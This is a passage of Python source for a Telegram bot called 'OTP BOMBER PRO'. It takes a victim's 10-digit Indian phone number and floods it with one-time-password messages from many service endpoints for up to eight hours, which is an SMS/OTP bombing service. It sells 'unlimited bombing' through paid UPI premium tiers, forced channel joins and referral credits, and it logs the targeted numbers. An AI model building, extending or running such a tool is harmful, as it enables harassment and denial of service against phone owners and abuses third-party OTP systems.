        stop_requested[user_id] = True
        active_bombs[user_id]["status"] = "stopped"
    
    if user_id in bomb_threads:
        try:
            bomb_threads[user_id].cancel()
        except:
            pass
        if user_id in bomb_threads:
            del bomb_threads[user_id]
    
    if user_id in countdown_messages:
        try:
            del countdown_messages[user_id]
        except:
            pass

def get_remaining_time(user_id: int) -> int:
    if user_id not in active_bombs:
        return 0
    if active_bombs[user_id]["status"] == "stopped":
        return 0
    remaining = int(active_bombs[user_id]["end_time"] - time.time())
    return max(0, remaining)

def is_bomb_running(user_id: int) -> bool:
    if user_id not in active_bombs:
        return False
    if active_bombs[user_id]["status"] == "stopped":
        return False
    if time.time() > active_bombs[user_id]["end_time"]:
        active_bombs[user_id]["status"] = "stopped"
        return False
    return True

def format_time(seconds: int) -> str:
    if seconds <= 0:
        return "0s"
    minutes = seconds // 60
    hours = minutes // 60
    minutes = minutes % 60
    seconds = seconds % 60
    
    if hours > 0:
        return f"{hours}h {minutes}m"
    elif minutes > 0:
        return f"{minutes}m {seconds}s"
    else:
        return f"{seconds}s"

# ===== QR CODE GENERATOR =====
def generate_qr(upi_id: str) -> bytes:
    qr_data = f"upi://pay?pa={upi_id}&pn=SKHHACKER&cu=INR"
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(qr_data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img_byte_arr = BytesIO()
    img.save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    return img_byte_arr.getvalue()

# ===== FORCE JOIN CHECK =====
async def check_force_join(user_id, context):
    try:
        member = await context.bot.get_chat_member(FORCE_JOIN_CHANNEL, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        logger.error(f"Force join check error: {e}")
    return False

# ===== KEYBOARD =====
def get_main_keyboard(user_id):
    credits = get_credits(user_id)
    premium = is_premium(user_id)
    tier = get_premium_tier(user_id)
    
    bomb_status = "🔴" if is_bomb_running(user_id) else "🟢"
    remaining = get_remaining_time(user_id)
    time_str = f" ⏱{format_time(remaining)}" if bomb_status == "🔴" else ""
    
    keyboard = [
        [
            KeyboardButton(f"💣 BOMB NOW {bomb_status}{time_str}")
        ],
        [
            KeyboardButton(f"💎 BUY PREMIUM")
        ],
        [
            KeyboardButton("👤 Profile"),
            KeyboardButton("🔗 Referral")
        ],
        [
            KeyboardButton("🎁 Daily Bonus +2"),
            KeyboardButton("📊 History")
        ],
        [
            KeyboardButton("❓ HOW TO USE"),
            KeyboardButton("⏹ STOP BOMB")
        ],
    ]
    
    if user_id in ADMIN_IDS:
        keyboard.append([KeyboardButton("⚙️ ADMIN PANEL")])
    
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        [KeyboardButton("📢 Broadcast"), KeyboardButton("⭐ Add Credits")],
        [KeyboardButton("💎 Activate Premium"), KeyboardButton("📊 User List")],
        [KeyboardButton("🖼 Set QR Code"), KeyboardButton("💳 Set UPI ID")],
        [KeyboardButton("🔙 Back")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    
    user = update.effective_user
    user_id = user.id
    
    if not await check_force_join(user_id, context):
        keyboard = [[KeyboardButton("✅ JOIN CHANNEL")]]
        await update.message.reply_text(
            f"🔒 Access Restricted\n━━━━━━━━━━━━━━━━━\n\nPlease join our channel first:\n{CHANNEL_LINK}\n\nAfter joining, click the button below.",
            reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        )
        return
    
    ref_by = None
    if context.args:
        ref_code = context.args[0]
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id FROM users WHERE referral_code = ?", (ref_code,))
        result = c.fetchone()
        conn.close()
        if result:
            ref_by = result[0]
    
    create_user(user_id, user.username or "", user.first_name or "", ref_by)
    
    credits = get_credits(user_id)
    tier = get_premium_tier(user_id)
    premium = is_premium(user_id)
    
    credit_text = "UNLIMITED" if premium else f"{credits}"
    
    await update.message.reply_text(
        f"✨ OTP BOMBER PRO\n━━━━━━━━━━━━━━━━━\n\n👋 Welcome, {user.first_name}!\n⭐ Credits: {credit_text}\n💎 Tier: {tier.upper()}\n\n⏱ Auto-Stop Timers:\n┣ Free → 2 min\n┣ 1 Day → 5 min\n┣ 1 Month → 5 hrs\n┗ 3 Month → 8 hrs\n\n━━━━━━━━━━━━━━━━━\n🔹 Use buttons below to bomb",
        reply_markup=get_main_keyboard(user_id)
    )

async def how_to_use(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    premium = is_premium(user_id)
    
    text = f"❓ HOW TO USE - OTP BOMBER\n━━━━━━━━━━━━━━━━━━━━\n\n📌 1. BOMBING\n┣ Click BOMB NOW button\n┣ Send a 10-digit phone number\n┣ Confirm the bomb\n┗ Wait for OTPs to be sent\n\n📌 2. CREDITS\n┣ Each bomb costs 1 credit\n┣ Get 3 credits on signup\n┣ Daily bonus: +2 credits\n┣ Referral: +1 credit/user\n┗ {'Premium: UNLIMITED!' if premium else 'Buy premium for unlimited!'}\n\n📌 3. PREMIUM\n┣ 1 Day: Rs.40 → 5 min timer\n┣ 1 Month: Rs.149 → 5 hrs timer\n┗ 3 Months: Rs.270 → 8 hrs timer\n\n📌 4. STOP BOMB\n┗ Click STOP BOMB anytime\n\n📌 5. AUTO-STOP\n┣ Free: 2 minutes\n┣ 1 Day Premium: 5 minutes\n┣ 1 Month Premium: 5 hours\n┗ 3 Month Premium: 8 hours\n\n━━━━━━━━━━━━━━━━━━━━\n🔹 @primedraco12"
    
    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id))

async def handle_join_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if await check_force_join(user_id, context):
        await start(update, context)
    else:
        await update.message.reply_text(
            f"❌ Not Joined Yet!\n\nPlease join: {CHANNEL_LINK}\nThen click the button again.",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("✅ JOIN CHANNEL")]], resize_keyboard=True)
        )

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied.", reply_markup=get_main_keyboard(user_id))
        return
    
    all_users = get_all_users()
    total = len(all_users)
    total_credits = sum(u[3] for u in all_users)
    premium_users = sum(1 for u in all_users if u[4] != 'free')
    
    text = f"⚙️ Admin Panel\n━━━━━━━━━━━━━━━━━\n\n👥 Users: {total}\n⭐ Credits: {total_credits}\n💎 Premium: {premium_users}\n🔴 Active Bombs: {len(active_bombs)}\n\n━━━━━━━━━━━━━━━━━"
    
    await update.message.reply_text(text, reply_markup=get_admin_keyboard())

async def handle_admin_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user or not update.message:
        return
    user_id = update.effective_user.id
    text = update.message.text or ""
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied.", reply_markup=get_main_keyboard(user_id))
        return
    
    if text == "📢 Broadcast":
        await update.message.reply_text(f"📢 Broadcast\n━━━━━━━━━━━━━━━━━\n\nSend the broadcast message.\n\nFormat: /broadcast Your message here", reply_markup=get_admin_keyboard())
    elif text == "⭐ Add Credits":
        await update.message.reply_text(f"⭐ Add Credits\n━━━━━━━━━━━━━━━━━\n\nFormat: /addcredits USER_ID AMOUNT\nExample: /addcredits 8520711928 10", reply_markup=get_admin_keyboard())
    elif text == "💎 Activate Premium":
        await update.message.reply_text(f"💎 Activate Premium\n━━━━━━━━━━━━━━━━━\n\nFormat: /activate USER_ID DAYS\nDays: 1, 30, or 90\n\nExample: /activate 8520711928 30", reply_markup=get_admin_keyboard())
    elif text == "📊 User List":
        users = get_all_users()
        text_msg = f"📊 User List\n━━━━━━━━━━━━━━━━━\n\n"
        for u in users[:20]:
            credit_display = "♾️" if u[4] != 'free' else f"⭐{u[3]}"
            text_msg += f"🆔 {u[0]}\n┣ {u[1] or 'NoUsername'}\n┣ {credit_display}\n┗ {u[4].upper() if u[4] else 'FREE'}\n\n"
        if len(users) > 20:
            text_msg += f"┗ ... and {len(users) - 20} more"
        await update.message.reply_text(text_msg, reply_markup=get_admin_keyboard())
    elif text == "🖼 Set QR Code":
        await update.message.reply_text(f"🖼 Set QR Code\n━━━━━━━━━━━━━━━━━\n\nSend me a QR code image.\n\nFormat: Send image with caption /setqr", reply_markup=get_admin_keyboard())
    elif text == "💳 Set UPI ID":
        await update.message.reply_text(f"💳 Set UPI ID\n━━━━━━━━━━━━━━━━━\n\nSend me the new UPI ID.\n\nFormat: /setupi newupi@bank", reply_markup=get_admin_keyboard())
    elif text == "🔙 Back":
        await update.message.reply_text(f"🔙 Back to Main Menu", reply_markup=get_main_keyboard(user_id))

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user or not update.message:
        return
    user_id = update.effective_user.id
    text = update.message.text or ""
    
    if not text:
        return


    if not text:
        return
    if not await check_force_join(user_id, context):
        keyboard = [[KeyboardButton("✅ JOIN CHANNEL")]]
        await update.message.reply_text(f"🔒 Access Restricted\n\nPlease join: {CHANNEL_LINK}", reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))
        return
    
    if text == "✅ JOIN CHANNEL":
        await handle_join_channel(update, context)
        return
    
    if text == "❓ HOW TO USE":
        await how_to_use(update, context)
        return
    
    if text == "⏹ STOP BOMB":
        if is_bomb_running(user_id):
            stop_bomb(user_id)
            await update.message.reply_text(f"⏹ Bomb Stopped!\n\nBombing has been stopped.", reply_markup=get_main_keyboard(user_id))
        else:
            await update.message.reply_text(f"❌ No Bomb Running!\n\nStart a bomb first.", reply_markup=get_main_keyboard(user_id))
        return
    
    if text.startswith("💣 BOMB NOW"):
        if is_bomb_running(user_id):
            remaining = get_remaining_time(user_id)
            await update.message.reply_text(f"⏳ Bomb Already Running!\n\nRemaining: {format_time(remaining)}\nUse STOP BOMB button to cancel.", reply_markup=get_main_keyboard(user_id))
            return
        
        if not is_premium(user_id):
            credits = get_credits(user_id)
            if credits < 1:
                await update.message.reply_text(f"❌ Insufficient Credits!\n\n⭐ Balance: {credits}\n\nWays to earn:\n┣ Daily Bonus: +2\n┣ Referral: +1 per user\n┗ Buy Premium: Unlimited", reply_markup=get_main_keyboard(user_id))
                return
        
        await update.message.reply_text(f"📱 Enter Phone Number\n━━━━━━━━━━━━━━━━━\n\nSend a 10-digit Indian number.\nExample: 9905066072\n\n{'⚠️ Cost: 1 credit per bomb' if not is_premium(user_id) else '🔥 PREMIUM: Unlimited bombing!'}\n\nClick HOW TO USE for help.")
        context.user_data['awaiting_bomb'] = True
        return
    
    if text == "💎 BUY PREMIUM":
        await premium_menu_text(update, context)
        return
    
    if text == "👤 Profile":
        await profile_text(update, context)
        return
    
    if text == "🔗 Referral":
        await referral_text(update, context)
        return
    
    if text == "🎁 Daily Bonus +2":
        await daily_bonus_text(update, context)
        return
    
    if text == "📊 History":
        await history_text(update, context)
        return
    
    if text == "⚙️ ADMIN PANEL":
        await admin_panel(update, context)
        return
    
    if user_id in ADMIN_IDS:
        await handle_admin_buttons(update, context)

async def premium_menu_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    tier = get_premium_tier(user_id)
    
    text = f"💎 Premium Plans\n━━━━━━━━━━━━━━━━━\n\n🔥 Unlimited Bombing!\n┣ No credit deductions\n┣ Priority support\n┗ Auto-stop timers\n\n📌 Plans:\n┣ 1 Day → Rs.40 → 5 min\n┣ 1 Month → Rs.149 → 5 hrs\n┗ 3 Months → Rs.270 → 8 hrs\n\n💎 Current: {tier.upper()}"
    
    keyboard = [
        [KeyboardButton("1 Day ₹40"), KeyboardButton("1 Month ₹149")],
        [KeyboardButton("3 Months ₹270")],
        [KeyboardButton("🔙 Back")]
    ]
    
    await update.message.reply_text(text, reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True))

async def handle_premium_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user or not update.message:
        return
    user_id = update.effective_user.id
    text = update.message.text or ""
    
    days_map = {"1 Day ₹40": 1, "1 Month ₹149": 30, "3 Months ₹270": 90}
    
    if text not in days_map:
        return
    
    days = days_map[text]
    price = {1: 40, 30: 149, 90: 270}.get(days, 40)
    timer_text = {1: "5 minutes", 30: "5 hours", 90: "8 hours"}.get(days, "5 minutes")
    upi_id = get_upi_id()
    qr_code = get_qr_code()
    
    payment_text = f"💎 Premium - {days} Days\n━━━━━━━━━━━━━━━━━\n\n💰 Amount: Rs.{price}\n⏱ Auto-Stop: {timer_text}\n\n📌 Payment Details:\n┣ UPI: {upi_id}\n┗ Name: SKHHACKER\n\n📌 Steps:\n1️⃣ Send Rs.{price} to the UPI above\n2️⃣ Click the I've Paid button below\n3️⃣ Send payment screenshot\n4️⃣ Wait for admin approval"
    
    keyboard = [
        [InlineKeyboardButton("✅ I've Paid", callback_data=f"paid_{days}")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_inline")]
    ]
    
    if qr_code:
        try:
            qr_bytes = bytes.fromhex(qr_code)
            await context.bot.send_photo(
                chat_id=update.effective_chat.id,
                photo=InputFile(BytesIO(qr_bytes), filename="qr.png"),
                caption="📱 Scan QR Code to Pay"
            )
        except Exception as e:
            logger.error(f"QR send error: {e}")
    
    await update.message.reply_text(payment_text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    context.user_data['pending_premium'] = days
    context.user_data['pending_amount'] = price

async def paid_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    days = int(query.data.replace("paid_", ""))
    amount = {1: 40, 30: 149, 90: 270}.get(days, 40)
    
    context.user_data['pending_premium'] = days
    context.user_data['pending_amount'] = amount
    context.user_data['awaiting_screenshot'] = True
    
    await query.edit_message_text(
        f"📸 Send Payment Screenshot\n━━━━━━━━━━━━━━━━━\n\nPlease send a screenshot of the payment.\n📦 Plan: {days} days\n💰 Amount: Rs.{amount}\n\n⚠️ Make sure the UPI ID and amount are visible.\n\n📌 Just send the screenshot here.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_inline")]])
    )

async def back_inline(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    context.user_data['pending_premium'] = None
    context.user_data['pending_amount'] = None
    context.user_data['awaiting_screenshot'] = False
    
    await query.edit_message_text(f"🔙 Back to Main Menu", reply_markup=get_main_keyboard(user_id))

async def handle_payment_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    
    user_id = update.effective_user.id
    
    if not context.user_data.get('awaiting_screenshot'):
        return
    
    if not update.message or not update.message.photo:
        await update.message.reply_text(f"❌ Please send a photo screenshot of the payment.\n\nSend the screenshot image here.", reply_markup=get_main_keyboard(user_id))
        return
    
    days = context.user_data.get('pending_premium', 1)
    amount = context.user_data.get('pending_amount', 40)
    
    photo = update.message.photo[-1]
    file_id = photo.file_id
    
    payment_id = add_pending_payment(user_id, days, amount, file_id)
    
    user = update.effective_user
    
    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_photo(
                chat_id=admin_id,
                photo=file_id,
                caption=f"💳 New Payment Request\n━━━━━━━━━━━━━━━━━\n\n👤 User: {user.first_name}\n🆔 ID: {user_id}\n📦 Plan: {days} days\n💰 Amount: Rs.{amount}\n📋 Payment ID: #{payment_id}\n\nClick buttons below:"
            )
            
            keyboard = [
                [InlineKeyboardButton("✅ APPROVE", callback_data=f"approve_{payment_id}"),
                 InlineKeyboardButton("❌ DECLINE", callback_data=f"decline_{payment_id}")]
            ]
            await context.bot.send_message(chat_id=admin_id, text=f"Payment #{payment_id} - {user.first_name} - Rs.{amount}", reply_markup=InlineKeyboardMarkup(keyboard))
        except Exception as e:
            logger.error(f"Error sending payment to admin: {e}")
    
    context.user_data['awaiting_screenshot'] = False
    context.user_data['pending_premium'] = None
    context.user_data['pending_amount'] = None
    
    await update.message.reply_text(f"✅ Payment Screenshot Received!\n━━━━━━━━━━━━━━━━━\n\n⏳ Waiting for admin approval.\n📦 Plan: {days} days\n💰 Amount: Rs.{amount}\n\nYou'll be notified when approved.\nApproval usually takes 5-10 minutes.", reply_markup=get_main_keyboard(user_id))

async def approve_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    admin_id = query.from_user.id
    
    if admin_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Access Denied.")
        return
    
    payment_id = int(query.data.replace("approve_", ""))
    payment = get_pending_payment(payment_id)
    
    if not payment:
        await query.edit_message_text("❌ Payment not found or already processed.")
        return
    
    user_id = payment[1]
    days = payment[2]
    tier_map = {1: "premium_1d", 30: "premium_30d", 90: "premium_90d"}
    tier = tier_map.get(days, "premium_1d")
    
    set_premium(user_id, tier, days)
    update_payment_status(payment_id, "approved")
    
    timer_text = {1: "5 minutes", 30: "5 hours", 90: "8 hours"}.get(days, "5 minutes")
    
    try:
        await context.bot.send_message(user_id, f"💎 Premium Activated! 🎉\n━━━━━━━━━━━━━━━━━\n\n📦 Tier: {tier.upper()}\n📅 Duration: {days} days\n⏱ Auto-Stop: {timer_text}\n\n🔥 UNLIMITED BOMBING UNLOCKED!\nNow you have unlimited credits!\n\nThank you for your purchase! 🙏")
    except Exception as e:
        logger.error(f"Error notifying user: {e}")
    
    await query.edit_message_text(f"✅ Payment Approved!\n━━━━━━━━━━━━━━━━━\n\n👤 User ID: {user_id}\n📦 Plan: {days} days\n💎 Premium activated successfully!\nUser now has unlimited credits!")

async def decline_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    admin_id = query.from_user.id
    
    if admin_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Access Denied.")
        return
    
    payment_id = int(query.data.replace("decline_", ""))
    payment = get_pending_payment(payment_id)
    
    if not payment:
        await query.edit_message_text("❌ Payment not found or already processed.")
        return
    
    user_id = payment[1]
    update_payment_status(payment_id, "declined")
    
    try:
        await context.bot.send_message(user_id, f"❌ Payment Declined!\n━━━━━━━━━━━━━━━━━\n\nYour payment was declined.\nPlease contact admin for more info.\n\nPossible reasons:\n┣ Incorrect amount\n┣ Screenshot not clear\n┗ Payment not received")
    except Exception as e:
        logger.error(f"Error notifying user: {e}")
    
    await query.edit_message_text(f"❌ Payment Declined!\n━━━━━━━━━━━━━━━━━\n\n👤 User ID: {user_id}\n📦 Plan: {payment[2]} days\nPayment has been declined.")

async def profile_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ User not found.", reply_markup=get_main_keyboard(user_id))
        return
    
    credits = user[3]
    premium = user[4] == 1
    tier = user[5] if user[5] else "free"
    ref_code = user[7]
    ref_count = get_referral_count(user_id)
    
    credit_text = "UNLIMITED" if premium else f"{credits}"
    
    text = f"👤 Your Profile\n━━━━━━━━━━━━━━━━━\n\n🆔 ID: {user_id}\n👤 Name: {user[2]}\n⭐ Credits: {credit_text}\n💎 Tier: {tier.upper()}\n"
    if premium and user[6]:
        try:
            expiry = datetime.fromisoformat(user[6])
            text += f"📅 Expires: {expiry.strftime('%Y-%m-%d')}\n"
        except:
            pass
    text += f"🔗 Referrals: {ref_count}\n📅 Joined: {user[9][:10] if user[9] else 'Unknown'}\n\n🔗 Code: {ref_code}"
    
    if is_bomb_running(user_id):
        remaining = get_remaining_time(user_id)
        text += f"\n\n⏱ Running: {format_time(remaining)} left"
    
    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id))

async def referral_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user or not update.message:
        return
    user_id = update.effective_user.id
    user = get_user(user_id)
    if not user:
        await update.message.reply_text("❌ User not found.", reply_markup=get_main_keyboard(user_id))
        return

    ref_code = user[7]
    ref_count = get_referral_count(user_id)
    refs = get_referral_details(user_id)

    # === FIX: Get BOT'S username, not user's username ===
    try:
        bot_info = await context.bot.get_me()
        bot_username = bot_info.username if bot_info else None
    except Exception:
        bot_username = None

    # Fallback: try to get from bot_data cache
    if not bot_username and 'bot_username' in context.bot_data:
        bot_username = context.bot_data['bot_username']

    # Final fallback
    if not bot_username:
        bot_username = 'YourBot'
    else:
        # Cache it for future use
        context.bot_data['bot_username'] = bot_username

    text = f"🔗 Referral System\n━━━━━━━━━━━━━━━━━\n\n📋 Code: {ref_code}\n👥 Referrals: {ref_count}\n💰 Bonus: +1 credit/user\n\n🔹 Share this link:\nhttps://t.me/{bot_username}?start={ref_code}\n\n"

    if refs:
        text += "📋 Your Referrals:\n"
        for r in refs[:10]:
            text += f"┣ {r[1] or 'User'}\n"

    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id))

async def daily_bonus_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if can_claim_daily(user_id):
        claim_daily(user_id)
        new_credits = get_credits(user_id)
        await update.message.reply_text(f"🎁 Daily Bonus Claimed!\n━━━━━━━━━━━━━━━━━\n\n⭐ +2 Credits added!\n💰 New Balance: {new_credits}\n\nCome back tomorrow for more.", reply_markup=get_main_keyboard(user_id))
    else:
        await update.message.reply_text(f"❌ Already Claimed Today!\n\n⏳ Try again after 24 hours.", reply_markup=get_main_keyboard(user_id))

async def history_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT phone, endpoint_count, success_count, duration, created_at 
        FROM usage_logs WHERE user_id = ? ORDER BY created_at DESC LIMIT 10''', (user_id,))
    logs = c.fetchall()
    conn.close()
    
    text = f"📊 Bomb History\n━━━━━━━━━━━━━━━━━\n\n"
    if logs:
        for log in logs:
            date = log[4][:16] if log[4] else "Unknown"
            dur = format_time(log[3]) if log[3] else "0s"
            text += f"📱 {log[0]}\n┣ ✅ {log[2]}/{log[1]}\n┗ ⏱ {dur} | {date}\n\n"
    else:
        text += "No history yet."
    
    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id))

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user or not update.message:
        return
    
    user_id = update.effective_user.id

    # === FIX: Route /setqr command sent as photo caption ===
    # CommandHandler only checks message.text, not message.caption
    # So when admin sends photo with /setqr caption, it comes here via MessageHandler(filters.PHOTO)
    if update.message.photo and update.message.caption:
        caption = update.message.caption.strip()
        if caption.startswith('/setqr'):
            await set_qr_command(update, context)
            return

    text = update.message.text or ""
    
    if text in ["1 Day ₹40", "1 Month ₹149", "3 Months ₹270"]:
        await handle_premium_selection(update, context)
        return
    
    if text == "🔙 Back":
        await update.message.reply_text(f"🔙 Back to Main Menu", reply_markup=get_main_keyboard(user_id))
        return
    
    # Check for screenshot in payment flow FIRST
    if context.user_data.get('awaiting_screenshot'):
        if update.message.photo:
            await handle_payment_screenshot(update, context)
            return
        else:
            await update.message.reply_text(f"📸 Please send a photo screenshot!\n\nSend the payment screenshot image.\nNot text messages.", reply_markup=get_main_keyboard(user_id))
            return
    
    if context.user_data.get('awaiting_bomb'):
        phone = clean_phone(text)
        if not phone:
            await update.message.reply_text(f"❌ Invalid Number!\n\nSend a valid 10-digit number.", reply_markup=get_main_keyboard(user_id))
            return
        
        if not is_premium(user_id):
            credits = get_credits(user_id)
            if credits < 1:
                await update.message.reply_text(f"❌ Insufficient Credits!\n\n⭐ Balance: {credits}\n\nWays to earn:\n┣ Daily Bonus: +2\n┣ Referral: +1 per user\n┗ Buy Premium: Unlimited", reply_markup=get_main_keyboard(user_id))
                context.user_data['awaiting_bomb'] = False
                return
            
            update_credits(user_id, -1)
            credit_msg = f"⭐ Remaining: {get_credits(user_id)}"
        else:
            credit_msg = "UNLIMITED (Premium)"
        
        context.user_data['awaiting_bomb'] = False
        
        tier = get_premium_tier(user_id)
        duration = TIMERS.get(tier, TIMERS["free"])
        time_str = format_time(duration)
        
        # Send initial message
        msg = await update.message.reply_text(f"💣 Bombing Started!\n━━━━━━━━━━━━━━━━━\n\n📱 Target: {phone}\n⏱ Auto-Stop: {time_str}\n📡 Endpoints: {len(ENDPOINTS)}\n⚡ Speed: FAST\n💰 {credit_msg}\n\nUse STOP BOMB button to cancel.")
        
        # Store message ID for countdown updates
        countdown_messages[user_id] = msg.message_id
        
        # Start timer with countdown
        start_bomb_timer(user_id, phone, duration, context)
        
        # Start countdown thread
        threading.Thread(target=update_countdown, args=(user_id, duration, context), daemon=True).start()
        
        def run_bomb():
            try:
                results, success_count = bomb_phone_fast(phone, user_id)
                log_usage(user_id, phone, len(ENDPOINTS), success_count, duration)
            except Exception as e:
                logger.error(f"Bomb execution error: {e}")
        
        threading.Thread(target=run_bomb, daemon=True).start()
        return
    
    if not text:
        return

    await handle_buttons(update, context)

# ===== ADMIN COMMANDS =====
async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    message = " ".join(context.args)
    users = get_all_users()
    sent = 0
    
    status_msg = await update.message.reply_text(f"📢 Broadcasting...")
    
    for u in users:
        try:
            await context.bot.send_message(u[0], f"📢 Announcement\n━━━━━━━━━━━━━━━━━\n\n{message}")
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Broadcast error to {u[0]}: {e}")
    
    await status_msg.edit_text(f"✅ Broadcast sent to {sent}/{len(users)} users.")

async def add_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addcredits USER_ID AMOUNT")
        return
    
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except:
        await update.message.reply_text("❌ Invalid user ID or amount.")
        return
    
    update_credits(target_id, amount)
    await update.message.reply_text(f"✅ Added {amount} credits to user {target_id}.")

async def activate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /activate USER_ID DAYS")
        return
    
    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
    except:
        await update.message.reply_text("❌ Invalid user ID or days.")
        return
    
    tier_map = {1: "premium_1d", 30: "premium_30d", 90: "premium_90d"}
    tier = tier_map.get(days, "premium_1d")
    
    set_premium(target_id, tier, days)
    await update.message.reply_text(f"✅ Activated {tier} for {days} days to user {target_id}.")
    
    timer_text = {1: "5 minutes", 30: "5 hours", 90: "8 hours"}.get(days, "5 minutes")
    
    try:
        await context.bot.send_message(target_id, f"💎 Premium Activated! 🎉\n━━━━━━━━━━━━━━━━━\n\n📦 Tier: {tier.upper()}\n📅 Duration: {days} days\n⏱ Auto-Stop: {timer_text}\n\n🔥 UNLIMITED BOMBING UNLOCKED!\nNow you have unlimited credits!")
    except Exception as e:
        logger.error(f"Error notifying user: {e}")

async def set_qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set QR code - Handles both direct command and photo caption"""
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        if update.message:
            await update.message.reply_text("❌ Access Denied.")
        return

    # Check if message has photo (works for both direct photo and caption)
    if not update.message or not update.message.photo or len(update.message.photo) == 0:
        await update.message.reply_text(
            "❌ No photo found!\n\n"
            "Please send a QR code image with caption /setqr\n"
            "Or reply to a photo with /setqr"
        )
        return

    try:
        # Get the highest resolution photo (last in array)
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        file_bytes = await file.download_as_bytearray()

        # Validate file size (max 5MB)
        if len(file_bytes) > 5 * 1024 * 1024:
            await update.message.reply_text("❌ Image too large! Max size: 5MB")
            return

        # Save as hex string in database
        hex_string = file_bytes.hex()
        update_setting('qr_code', hex_string)

        # Verify it was saved
        saved = get_qr_code()
        if saved and len(saved) > 0:
            await update.message.reply_text(
                "✅ QR Code saved successfully!\n\n"
                f"📊 Size: {len(file_bytes)} bytes\n"
                f"🖼 Resolution: {photo.width}x{photo.height}\n"
                "💎 Premium users will now see this QR code."
            )
        else:
            await update.message.reply_text("❌ Failed to verify saved QR code. Please try again.")

    except TelegramError as te:
        logger.error(f"Telegram API error in set_qr: {te}")
        await update.message.reply_text(f"❌ Telegram API Error: {str(te)[:200]}")
    except Exception as e:
        logger.error(f"QR save error: {e}")
        await update.message.reply_text(f"❌ Error saving QR: {str(e)[:200]}\n\nPlease try again.")

async def set_upi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update or not update.effective_user:
        return
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Access Denied.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /setupi <upi_id>")
        return
    
    upi_id = " ".join(context.args)
